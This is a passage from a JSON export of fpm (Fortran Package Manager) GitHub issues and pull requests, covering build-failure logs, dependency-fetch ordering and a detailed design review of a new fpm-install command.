            "text": "I wanted to see how well the Fortran version was doing (I haven't really used it at all yet). I tried building my jsonff package and got the following error.\n + gfortran -c build/dependencies/iso_varying_string/src/ISO_VARYING_STRING.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_iso_varying_string_src_ISO_VARYING_STRING.f90.o\n + gfortran -c build/dependencies/erloff/src/Module_m.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_erloff_src_Module_m.f90.o\n + gfortran -c build/dependencies/erloff/src/Procedure_m.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_erloff_src_Procedure_m.f90.o\n + gfortran -c build/dependencies/strff/src/strff.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_strff_src_strff.f90.o\n + gfortran -c build/dependencies/erloff/src/Call_stack_entry_m.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_erloff_src_Call_stack_entry_m.f90.o\n + gfortran -c build/dependencies/erloff/src/Call_stack_m.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_erloff_src_Call_stack_m.f90.o\n + gfortran -c build/dependencies/erloff/src/Message_m.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_erloff_src_Message_m.f90.o\n + gfortran -c build/dependencies/erloff/src/Error_list_m.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_erloff_src_Error_list_m.f90.o\n + gfortran -c build/dependencies/erloff/src/Message_list_m.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_erloff_src_Message_list_m.f90.o\n + gfortran -c build/dependencies/erloff/src/erloff.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_erloff_src_erloff.f90.o\n + gfortran -c build/dependencies/parff/src/parff.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/dependencies_parff_src_parff.f90.o\n + gfortran -c ./src/jsonff.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/jsonff -o build/gfortran_debug/jsonff/jsonff.f90.o\n./src/jsonff.f90:46:17:\n\n   46 |             join, &\n      |                 1\nError: Symbol 'readfile' referenced at (1) not found in module 'strff'\ncompilation terminated due to -fmax-errors=1.\n Command failed\nERROR STOP \n\nError termination. Backtrace:\n#0  0x101fc4ebd\n#1  0x101fc5b75\n#2  0x101fc6f03\n#3  0x101f109f8\n#4  0x101efd552\n#5  0x101efcc32\n#6  0x101efdffd\n#7  0x101ef8ddd\n#8  0x101f92886\n\nThis error is from MacOS, but a similar one is emitted on Linux. It appears it is fetching the incorrect version of strff. It fetched version 1.0.0, but version 1.2.0 is specified in the fpm.toml. Maybe it's fetching dependencies depth first instead of breadth first?",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-01 08:42:30+00:00",
                    "text": "Thanks for reporting, yes it's fetching depth first. Since we don't (yet) check for conflicting versions in dependencies, is breadth first the correct/preferred way of fetching?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-01 15:55:41+00:00",
                    "text": "By doing breadth first, the user can manually specify a specific version for a dependency if there are any conflicts, because it fetches exactly what they've specified first."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-01 16:08:15+00:00",
                    "text": "Ah I see, thanks for explaining."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-02 20:29:43+00:00",
                    "text": "I was using jsonff to test my dependency resolution, so this issue will probably be fixed with #266."
                }
            ]
        },
        {
            "number": 264,
            "user": "everythingfunctional",
            "date": "2020-12-01 02:28:47+00:00",
            "title": "Failure to build vegetables",
            "text": "I wanted to see how well the Fortran version was doing (I haven't really used it at all yet). I tried building my vegetables package and got the following error.\nUnable to find source for module dependency: \"parff\" used by \"app/make_driver_m.f90\"\nERROR STOP 1\n\nError termination. Backtrace:\n#0  0x105acfebd\n#1  0x105ad0b75\n#2  0x105ad1f6e\n#3  0x105a03440\n#4  0x105a9b886\n\nLooks like it just isn't fetching the dependency specified for the executable, as seen in the below fpm.toml file.\nname = \"vegetables\"\nversion = \"6.0.0\"\nlicense = \"MIT\"\nauthor = \"Brad Richardson\"\nmaintainer = \"everythingfunctional@protonmail.com\"\ncopyright = \"2020 Brad Richardson\"\n\n[dependencies]\n  iso_varying_string = { git = \"https://gitlab.com/everythingfunctional/iso_varying_string.git\", tag = \"v2.0.0\" }\n  strff = { git = \"https://gitlab.com/everythingfunctional/strff.git\", tag = \"v2.0.0\" }\n\n[[executable]]\n  name = \"make_vegetable_driver\"\n  source-dir = \"app\"\n  main = \"main.f90\"\n  [executable.dependencies]\n    parff = { git = \"https://gitlab.com/everythingfunctional/parff.git\", tag = \"v2.0.0\" }",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-01 07:07:36+00:00",
                    "text": "Duplicate of #228"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-06 08:01:18+00:00",
                    "text": "This issue might be fixed with #266 and #267 together. Trying with #266 triggers a similar error like in #263."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-10 17:13:56+00:00",
                    "text": "With #266 and #267 merged, there's a new error due to a bug in the source parsing routines which is incorrectly detecting a module as a program. I will look into a fix"
                }
            ]
        },
        {
            "number": 263,
            "user": "everythingfunctional",
            "date": "2020-12-01 02:24:07+00:00",
            "title": "Failure to build iso_varying_string",
            "text": "I wanted to see how well the Fortran version was doing (I haven't really used it at all yet). I tried building my iso_varying_string package and got the following error.\n + gfortran  build/gfortran_debug/test/unit_test_main.f90.o build/gfortran_debug/test/unit_test_adjustl_test.f90.o build/gfortran_debug/test/unit_test_adjustr_test.f90.o build/gfortran_debug/test/unit_test_assignment_test.f90.o build/gfortran_debug/test/unit_test_char_test.f90.o build/gfortran_debug/test/unit_test_concat_test.f90.o build/gfortran_debug/test/unit_test_equal_test.f90.o build/gfortran_debug/test/unit_test_extract_test.f90.o build/gfortran_debug/test/unit_test_greater_than_equal_test.f90.o build/gfortran_debug/test/unit_test_greater_than_test.f90.o build/gfortran_debug/test/unit_test_iachar_test.f90.o build/gfortran_debug/test/unit_test_ichar_test.f90.o build/gfortran_debug/test/unit_test_index_test.f90.o build/gfortran_debug/test/unit_test_insert_test.f90.o build/gfortran_debug/test/unit_test_len_test.f90.o build/gfortran_debug/test/unit_test_len_trim_test.f90.o build/gfortran_debug/test/unit_test_less_than_equal_test.f90.o build/gfortran_debug/test/unit_test_less_than_test.f90.o build/gfortran_debug/test/unit_test_lge_test.f90.o build/gfortran_debug/test/unit_test_lgt_test.f90.o build/gfortran_debug/test/unit_test_lle_test.f90.o build/gfortran_debug/test/unit_test_llt_test.f90.o build/gfortran_debug/test/unit_test_not_equal_test.f90.o build/gfortran_debug/test/unit_test_remove_test.f90.o build/gfortran_debug/test/unit_test_repeat_test.f90.o build/gfortran_debug/test/unit_test_replace_range_test.f90.o build/gfortran_debug/test/unit_test_replace_start_test.f90.o build/gfortran_debug/test/unit_test_replace_target_test.f90.o build/gfortran_debug/test/unit_test_scan_test.f90.o build/gfortran_debug/test/unit_test_split_character_set_test.f90.o build/gfortran_debug/test/unit_test_split_string_set_test.f90.o build/gfortran_debug/test/unit_test_trim_test.f90.o build/gfortran_debug/test/unit_test_var_str_test.f90.o build/gfortran_debug/test/unit_test_verify_test.f90.o -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/iso_varying_string build/gfortran_debug/iso_varying_string/libiso_varying_string.a  -o build/gfortran_debug/test/unit_test\nUndefined symbols for architecture x86_64:\n  \"___custom_generator_MOD___vtab_3126CD9\", referenced from:\n      ___repeat_test_MOD_test_repeat in unit_test_repeat_test.f90.o\n  \"___custom_generator_MOD___vtab_custom_generator_Ascii_character_generator_t\", referenced from:\n      ___iachar_test_MOD_test_iachar in unit_test_iachar_test.f90.o\n      ___ichar_test_MOD_test_ichar in unit_test_ichar_test.f90.o\n  \"___custom_generator_MOD___vtab_custom_generator_Ascii_string_pair_generator_t\", referenced from:\n      ___concat_test_MOD_test_concat in unit_test_concat_test.f90.o\n      ___equal_test_MOD_test_equals in unit_test_equal_test.f90.o\n      ___greater_than_equal_test_MOD_test_greater_than_equals in unit_test_greater_than_equal_test.f90.o\n      ___greater_than_test_MOD_test_greater_than in unit_test_greater_than_test.f90.o\n      ___index_test_MOD_test_index in unit_test_index_test.f90.o\n      ___less_than_equal_test_MOD_test_less_than_equals in unit_test_less_than_equal_test.f90.o\n      ___less_than_test_MOD_test_less_than in unit_test_less_than_test.f90.o\n      ...\n  \"___custom_generator_MOD___vtab_custom_generator_Character_input_t\", referenced from:\n      ___iachar_test_MOD_check_iachar in unit_test_iachar_test.f90.o\n      ___ichar_test_MOD_check_ichar in unit_test_ichar_test.f90.o\n  \"___custom_generator_MOD___vtab_custom_generator_String_and_integer_input_t\", referenced from:\n      ___repeat_test_MOD_check_repeat in unit_test_repeat_test.f90.o\n  \"___custom_generator_MOD___vtab_custom_generator_String_pair_input_t\", referenced from:\n      ___concat_test_MOD_check_concat_character_and_string in unit_test_concat_test.f90.o\n      ___concat_test_MOD_check_concat_string_and_character in unit_test_concat_test.f90.o\n      ___concat_test_MOD_check_concat_strings in unit_test_concat_test.f90.o\n      ___equal_test_MOD_check_string_equal_character in unit_test_equal_test.f90.o\n      ___equal_test_MOD_check_character_equal_string in unit_test_equal_test.f90.o\n      ___equal_test_MOD_check_string_equal_string in unit_test_equal_test.f90.o\n      ___greater_than_equal_test_MOD_check_string_greater_than_equal_character in unit_test_greater_than_equal_test.f90.o\n      ...\nld: symbol(s) not found for architecture x86_64\ncollect2: error: ld returned 1 exit status\n Command failed\nERROR STOP \n\nError termination. Backtrace:\n#0  0x106e70ebd\n#1  0x106e71b75\n#2  0x106e72f03\n#3  0x106dbb9f8\n#4  0x106da8810\n#5  0x106da90b2\n#6  0x106da7a0f\n#7  0x106e3d894\n\nThis error is from MacOS, but a similar one is emitted on Linux. I suspect an issue with ordering of things in the link command, but I'm not sure.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-01 08:38:14+00:00",
                    "text": "Thanks for trying it out @everythingfunctional and reporting these. It appears there's a bug where tests and executables are only linked to non-library modules that they use directly. Non-library modules that are used via other modules are not added to the link list. Since this relates to the refactoring in #248, I will prepare a fix and tests for after that is merged."
                }
            ]
        },
        {
            "number": 262,
            "user": "everythingfunctional",
            "date": "2020-12-01 02:13:48+00:00",
            "title": "Add -fcoarray=single to default gfortran flags",
            "text": "By adding this flag to the default set, fpm can at least compile code using coarray features by default if not actually run multiple images.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-01 17:08:10+00:00",
                    "text": "\ud83d\udc4d , I'll go ahead and merge then since it's such a small change"
                }
            ]
        },
        {
            "number": 261,
            "user": "awvwgk",
            "date": "2020-11-30 22:18:13+00:00",
            "title": "Create a specification of the fpm command line interface (pandoc)",
            "text": "Create fpm(1) and the currently available six subcommand manual pages.\nTo check the resulting manual pages on the command line translate them with pandoc:\npandoc -s -t manpage fpm.1.md\nman -l fpm.1\n\n\nPandoc is written is Haskell and requires the usual set of Haskell dependencies, which you should have around anyway to compile Bootstrap fpm with stack.\n\nPlease review this PR while comparing to #230 and consider the following points\n\nsetup/usage of the toolchain\nthe markup language to express the command line documentation\nthe output (both HTML and roff/man page)\nthe preview on GH\n\nCloses #227\nCloses #230",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-03-02 08:26:26+00:00",
                    "text": "Closing this for now. I might pickup the project again at some point. Feel free to use 577f5e2 in case anyone wants to continue on this project."
                }
            ]
        },
        {
            "number": 260,
            "user": "LKedward",
            "date": "2020-11-30 15:55:23+00:00",
            "title": "Fix CI to test release build",
            "text": "Fixes the CI so that it also tests the release build\n\nArguments to the CI scripts are passed on to fpm build, fpm run and fpm test to parameterize the test scripts\n\n\nFixes #254: workaround for compiler bug in Windows release build\n\nUpdate M_CLI2 revision to include upstream fix (urbanjost/M_CLI2#4)\n\n\n\nSee here for a successful workflow with the updated CI. (See here for the same workflow run prior to applying the Windows fixes.)\nSince this PR affects our CI checks and our release binaries, I think it should be prioritised over the several existing PRs, and I would be grateful for reviews.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-01 13:13:02+00:00",
                    "text": "Many thanks for the quick reviews all. I'll merge later today with a new release if there are no more comments."
                }
            ]
        },
        {
            "number": 259,
            "user": "awvwgk",
            "date": "2020-11-29 18:09:00+00:00",
            "title": "Reorder README to focus on the Fortran fpm version",
            "text": "A suggestion to reorder the README to set the focus on fpm itself.\nThe bootstrapping process is described in a collapsed details section.\nRelated #253",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-11-30 17:58:19+00:00",
                    "text": "Introducing the install.sh script significantly reduces the bootstrap instructions, I think we don't have to collapse them anymore because they also serve as reference to compile Fortran fpm with itself."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-01 01:20:53+00:00",
                    "text": "Thank you!"
                }
            ]
        },
        {
            "number": 258,
            "user": "awvwgk",
            "date": "2020-11-29 14:06:36+00:00",
            "title": "Platform specific testing",
            "text": "I'm kinda run into this issue when creating unit tests for the fpm-install command. We make a lot of implicit assumptions on the OS which does not allow to test both variants on the same build machine. It would be helpful for unit testing (and caching) to give all filesystem operations an optional input to set the build machine OS. Testing this kind of stuff on the CI is not great.\nAlso this allows to cache the OS identifier minimizes the calls to get_os_type.\nThe alternative would be to always abstract all OS specific testing in a separate library, but this just shifts the problem away to another project.",
            "comments": []
        },
        {
            "number": 257,
            "user": "awvwgk",
            "date": "2020-11-29 10:27:46+00:00",
            "title": "Implement fpm-install command",
            "text": "Noticed I require some working install command, when working on the fpm-dist command. Therefore, I coded up an installer type and implemented the fpm-install command.\n\n allow installing of executables\n optionally install library and modules if specified in manifest\n add install table to manifest reference\n use in CI to install fpm\n add unit tests for new manifest entry\n add unit tests for new installer type\n\nRelated #71\nCommand-line interface:\nNAME\n fpm-install(1) - install fpm projects\n\nSYNOPSIS\n fpm install [--release] [--no-rebuild] [--prefix DIR]\n             [--bindir DIR] [--libdir DIR] [--includedir DIR]\n             [--verbose]\n\nDESCRIPTION\n Subcommand to install fpm projects.\n\nOPTIONS\n --release         selects the optimized build instead of the debug build\n --no-rebuild      do not rebuild project before installation\n --prefix DIR      path to installation directory (requires write access)\n --bindir DIR      subdirectory to place executables in\n --libdir DIR      subdirectory to place libraries and archives in\n --includedir DIR  subdirectory to place headers and module files in\n --verbose         print more information\n\nInstallation configuration:\n[install]\n# whether or not to install library + modules (default: false)\nlibrary = false",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-11-30 17:21:10+00:00",
                    "text": "In the help text I like the new word \"archies\"  but I think \"archives\" is probably better  (It's old meaning for the ackkk-ackkk sound of anti-aircraft gunnery is pretty much obsolete, so I think it might catch on though) :>"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-01 03:31:17+00:00",
                    "text": "It would be useful long-term to be able to set access permits, ownership and group but given there is not a platform-independent way to do that with pure Fortran it is problematic, although easy to do on POSIX platforms.\nDo you intend it to be able to create the specified directories if needed or must all target directories pre-exisit?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-01 03:35:50+00:00",
                    "text": "Should the default be to not rebuild and  a  --build switch be available instead of the opposite? I think that would be a more expected behavior. Althought the risk is low I would like to install an executable I have run tests on first, typically."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-01 06:19:17+00:00",
                    "text": "The help_install should be added to the list of help produced when you ask for the entire manual, and the install subcommand should be added to the list of available subcommands in several places so it shows in the output for list and the list of commands in the fpm_help. So the output from  fpm --list|fpm list fpm --help|fpm help  and fpm help manual should mention the install command, not just help install. I like the function you added so the strings can be unallocated, but when I called sget() directly like lget() to set the types describing the command types I hit a gfortran bug when I built with optimization where I got segfaults.  I have not pulled and built this yet, just looked over the code but might want to try that. That is why I set variables and passed those for the most part when I used sget() (in a few places I was actually testing the string several times and preferred to do that anyway)."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-01 07:15:57+00:00",
                    "text": "It would be useful long-term to be able to set access permits, ownership and group but given there is not a platform-independent way to do that with pure Fortran it is problematic, although easy to do on POSIX platforms.\n\nI haven't added file permissions yet, because I wasn't sure how to do it on non-POSIX platforms.\n\nDo you intend it to be able to create the specified directories if needed or must all target directories pre-exisit?\n\nActually, missing directories are automatically created.\n\nShould the default be to not rebuild and a --build switch be available instead of the opposite? I think that would be a more expected behavior. Althought the risk is low I would like to install an executable I have run tests on first, typically.\n\nThe CMake install behaviour is exactly this, you have to invoke a separate CMake command to actually build before installing, which I find annoying. In meson install you get automatically a rebuild if required, with an incremental rebuild like in #248 we can always rebuild without much additional cost.\nI'm mainly orienting my strategy on the meson commands because it is in fact my main build system and I think it is well thought out.\n\nThe help_install should be added to the list of help produced when you ask for the entire manual\n\nWill add it there."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-01 17:15:40+00:00",
                    "text": "I want to see install implemented and this is great; in the mean time I have been using the GNU/Linux install(1) command and the --runner option; but would prefer it integrated as you are doing here.  Personally I use platforms with POSIX interfaces  (on MSWindows either Cygwin or the Linux subshell) and permissions are relatively straight forward there. Users can verify the permits outside of fpm(1) but other than adding platform-specific commands or having conditional builds it is vexing.  I am not sure if stdlib is near releasing system features like this.  Should we be building a POSIX look-alike for each routine as we need it for now ( a topic for discussion outside of here, I suppose)?  There are a lot of things like CHMOD and CHDIR functionality that would make fpm so much nicer.  I actually use a shell wrapper with fpm that finds and moves to a directory with the fpm.toml file before executing because I find that so irritating that I have to move to that directory first; which would be trivially resolved with a CHDIR; but I digress.  Looks good but long-term it is likely permissions will be issue; but perhaps for now letting the user handle that is more reasonable than a kludge?  Since you are doing a system-dependent copy command though; perhaps adding a chmod after the copy is good for now?  I always prefer execute-only for everyone other than the owner for a binary executable myself.  I was comparing this to the command install(1) (which has its detractors by the way) and it defaults to backing up existing executables. Personally I do not need that, but install(1) has been around a long time so I thought I would mention it. The cp(1) and chmod(1) are essentially guaranteed on any GNU or Unix platform, I do not think install(1) itself is common enough to use it instead of cp(1) directly(?)."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-03 17:28:20+00:00",
                    "text": "At first glance I like it and I've been wanting something like it for a while now. A couple requests/suggestions though.\n\nI would prefer the default prefix be $HOME/.local. Many package managers are starting to default to this, and I like that it doesn't require sudo or administrative privileges.\nI would like a way to specify that only executable(s) be installed, and a way to specify only a specific executable. I.e. --target my_executable in symmetry with run and test."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-04 09:31:11+00:00",
                    "text": "I would prefer the default prefix be $HOME/.local. Many package managers are starting to default to this, and I like that it doesn't require sudo or administrative privileges.\n\nSounds good, what is the preferred prefix for Windows? I usually don't use the default prefix and always set my own to cope with the various software from different sources on my machines.\n\nI would like a way to specify that only executable(s) be installed, and a way to specify only a specific executable. I.e. --target my_executable in symmetry with run and test.\n\nNot sure about this, my expectation on the install command is to get complete project exported to another prefix. What is included in the installation should be the decision of the project maintainer rather than the user or packager. It is hard to tell as user or packager which parts of a project can be installed independently. If a project provides executables that can be installed independently, we should rather encourage splitting the project."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-04 13:59:36+00:00",
                    "text": "my expectation on the install command is to get complete project exported to another prefix\n\nIf you start installing libraries from different projects, you start to reintroduce the problem sandboxing them into the project for building solved in the first place. Right now we are statically linking (at least the Haskell version is). I know it's \"inefficient\" because you might end up with executables with the same copy of some library, but I think it's far more common that you'll have executables that need different versions of some library. At least that's the experience other languages have had.\nWith fpm, I no longer need to install libraries or worry about coming up with some common version that satisfies my needs for every project I'm working on. Given that, I don't know why I would ever install a library. I understand that for some people old habits die hard, and there are use cases where you would want to install a library, so I'm fine with having a way to do it, but I want a way not to do it."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-04 14:21:53+00:00",
                    "text": "Maybe we are talking about a different problems here.\n\nIf you start installing libraries from different projects, you start to reintroduce the problem sandboxing them into the project for building solved in the first place. Right now we are statically linking (at least the Haskell version is). I know it's \"inefficient\" because you might end up with executables with the same copy of some library, but I think it's far more common that you'll have executables that need different versions of some library. At least that's the experience other languages have had.\n\nI don't disagree with this point, for executables this works completely fine. As somebody packaging I would like to see a way to opt-out of the static linking, of course \ud83d\ude09. I see the conflict here and don't want to impose this on fpm, because it is out of scope for the project, however I will try to implement a solution with fpm-dist which suits the needs for packaging instead.\n\nWith fpm, I no longer need to install libraries or worry about coming up with some common version that satisfies my needs for every project I'm working on. Given that, I don't know why I would ever install a library. I understand that for some people old habits die hard, and there are use cases where you would want to install a library, so I'm fine with having a way to do it, but I want a way not to do it.\n\nBut for this point I disagree. There are several scenarios were I want to install a library. Use cases are\n\nlibrary-only projects, which do not provide executables by themselves (limited due to ABI issues)\nexporting non-module Fortran APIs or C APIs\ndynamically loading symbols from a shared library, e.g. interfacing a C API from Python\n\nSince this cases are the exception, a project has to opt-in on installing the library. Projects that want to install a library usually will do this for a good reason."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-07 09:31:35+00:00",
                    "text": "It seems like the default behaviour (of only installing executables) addresses your concern @everythingfunctional \u2014 are you happy for this PR move forward?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-08 12:19:48+00:00",
                    "text": "I have to rebase this branch and incorporate the --compiler flag here as well first."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-10 17:49:51+00:00",
                    "text": "Thanks for you patience on this PR. I rebased against the latest changes to allow checking how the fpm-install command works together with the example programs and the new fpm-update feature.\nTo address the comments above, by default all executables from the projects are installed, examples and tests are not considered for installation. If a project opts-in to installing a library, the archive and the module files are installed as well."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-13 12:47:39+00:00",
                    "text": "The only not addressed issue in the PR are the file permissions on POSIX systems together with the install(1) command. Since this PR is meant to create the foundation to implement any kind of installer, I would like to explore file permissions with a separate PR as this one is already quite large.\nUnless there is anything blocking this PR I will merge within the next week."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-12-13 16:45:25+00:00",
                    "text": "Thank you for this implementation. I just played with it now and it works. I have three suggestions:\n\nMake library = true under [install] in the manifest as the default. I don't have a good rationale for this other than that I expect packages to be installable by default. What do others think? Sorry if there has already been a discussion on this--I didn't see it.\nIf a package is not installable, i.e. if library = false is set in the manifest, then fpm install should emit some helpful message, for example:\nfpm-install as the name in the help message is a tad confusing because there's no such executable as fpm-install. Perhaps a man page is not a suitable format for these CLI help messages. But I'm not convinced either way.\n\nNothing to install ([install] library is set to false in fpm.toml)\n\nor something similar. Currently fpm install doesn't emit any output which usually implies non-verbose success."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-13 17:12:38+00:00",
                    "text": "Thanks for the comments, I included a check if the project is actually installable.\n\n\nMake library = true under [install] in the manifest as the default. I don't have a good rationale for this other than that I expect packages to be installable by default. What do others think? Sorry if there has already been a discussion on this--I didn't see it.\n\n\nThe preference seems to be an executable-only focus for now, to allow library projects the opt-in install.library is a good compromise in my opinion. We can revisit this once we flesh out the installer command in further PRs.\n\n\nfpm-install as the name in the help message is a tad confusing because there's no such executable as fpm-install. Perhaps a man page is not a suitable format for these CLI help messages. But I'm not convinced either way.\n\n\nSince our help pages are currently catman pages, I try to follow the conventions for man pages here. It seems to be a convention for man pages of subcommands like git add to be stored as git-add(1). Usually the command man git add is identical to man git-add, possibly to avoid whitespace in filenames. Using install(1) as name is not possible, because there is actually a program install(1) available on most Unix systems. That's my reason for choosing fpm-install(1)."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-13 18:59:11+00:00",
                    "text": "Name conficts with man pages were designed for their suffix to be a category, as there are often conflicts. Think of test, for example.\nThe other packages seem to be taking a short-cut.  If the manpages are named  topic.1fpm.gz instead of fpm-topic.1.gz  then entering\nman 1fpm topic \nman topic.1fpm\n\nwill go directly to it.  And you can list all the related man pages .  So if all the man pages have the fpm suffix  you can find them.\nThere are lots of other syntaxes that work too, as man(1) has a long history.  Maybe because people did not like using the number\npeople started adding one-line manpages named fpm-topic.1.gz that  where just an \".so\" of the topic.1fpm files. Now it looks like several packages just put subcommands in fpm-topic.1.gz files directly as you noted.\nIn the past the solution  was often to add a subcommand to your program like man  that would do something like set MANSECT to fpm and call the man(1) command  or copy flat versions of the man pages (usually generated by man topic|col -b` if the man command was not available.   So man(1) has lots of ways to handle duplicate names (which there are many of) but they are not commonly known and it looks like the program-subcommand syntax is used by at least git and cargo (on my machine those where the ony ones with actual man pages  named program-topic).\nSo there other ways; and perhaps  just  using topic.1fpm.gz files and adding a \"man\" subcommand or making fpm help topic smarter and if a whereis  1fpm topic returns a pathname it assumes man(1) is on the system and displays the help with man,\nelse displays flat text.  My impression is there are a good number of people interested in using fpm on non-open systems like MSWindows where man(1) is not available.\nAnyway, since I think those questions are unanswered that just writing it up as \"install\" is less confusing;  albeit the git and cargo\nexamples show this has become a popular solution that requires less intimacy with the man(1) command.  But if we are sure that\nthe documentation will be deployed with man(1) where available (I am good with that) I think we need consistency; so all pages should described themselves with a command name or all should use fpm-topic.  Mixing them is confusing.\nSo, for example, if I enter\ngit help rebase\nIt actually calls man(1).  Not sure how many users do the man of the git commands directly versus git help ... . Not sure what git does no platforms without man(1).  But unless we expect the man pages to be used directly a lot outside of fpm we do not have to use the fpm-topic format. Note when I use the git help I put in the topic \"rebase\" not \"git-rebase\".\nAnyway, I think we should expect that the main way to get on-line help will be \"fpm help topic\". Whether that calls man for formatting or a web browser or displays flat text or info files is then hidden from a new user. If that is true, there is no technical reason to follow the git(1) or cargo(1) convention other than how we want someone to see the pages when using man(1) directly."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-13 19:16:20+00:00",
                    "text": "looking around, there seem to be about eight approaches. Note that openssl does both but using links instead of \".so\" files:\n8 -rw-r--r--. 1 root root 5126 Mar  5  2020 genpkey.1ssl.gz\n0 lrwxrwxrwx. 1 root root   15 Mar  5  2020 openssl-genpkey.1ssl.gz -> genpkey.1ssl.gz\n\nSo they make a  topic.1ssl.gz file and then link openssl-genpkey.1ssl.gz to it so\nman openssl-genpkey\nman 1ssl genpkey\nman genpkey.1ssl\nman -a genpkey\n\nall work"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-13 19:29:09+00:00",
                    "text": "@urbanjost Thanks for the explanation, my knowledge about man is limited to the content of man man and related documents. While I found the general concept of man page topics helpful and started to use it initially quite extensively in my documentation, I got quickly tired of having to explain man pages and man topics to my co-developers and users and therefore eventually dropped it again. I still see the beauty in man topics, but it seemed like a lost fight to force it upon people."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-14 17:08:13+00:00",
                    "text": "A user developing a library or module  (ie. does not even have an app/ directory) that they want installed for usage outside of fpm\nin a conventional mode would have to know too much about fpm and TOML and the options allowed in fpm manifest files\n   Libraries and module files are only installed for projects requiring the\n   installation of those components in the package manifest.\n\nTo know they have to edit their fpm.toml file and add\n[install]\nlibrary=true\nso I agree with @milancurcic  that either the behavior or help text needs to change. The original fpm only created a src/ directory.\nI think a library install should be trigged if you specify the  --libdir OR --includedir switch regardless of the setting.  As it is if I do\n   f pm new A --src\n   # change A/src/A.f90 till it does what I want\n   fpm install --libdir [anything]\n\ninstall will do nothing and produce no message, which is very unintuitive.  At a minimum the help text could say something like\nDESCRIPTION\n Subcommand to install fpm projects. This command can install components\n of the project into external directories. It will install nothing but\n executables no matter what options are supplied unless the \"fpm.toml\" \n manifest file includes the equivalent of the entries\n\n    [include]\n    library = true\n\n By default it will install all executables (tests and examples\n are excluded).  If \"library=true\" it will also install all libraries and\n module files which are part of the project (not files from dependencies).\n\nAfter trying it with more complex projects  I would like it to\n\nuse the --list switch (to be most consistent with the other commands)\nor something like --dryrun  to show what it would do without doing it\nallow for a list of executable names to install  (which I think others mentioned)\n\nAlthough theoretically if all your components were in fpm installing libraries and modules would not be needed,\nbut initially I suspect the opposite is one of the bigger user cases.  Use fpm to create a library and export it for conventional use.\nExternal files are going to be around for a while. Users will want to make not just applications but libraries available to non-fpm users;  and people will develop dynamic libraries that need to be in user load paths."
                },
                {
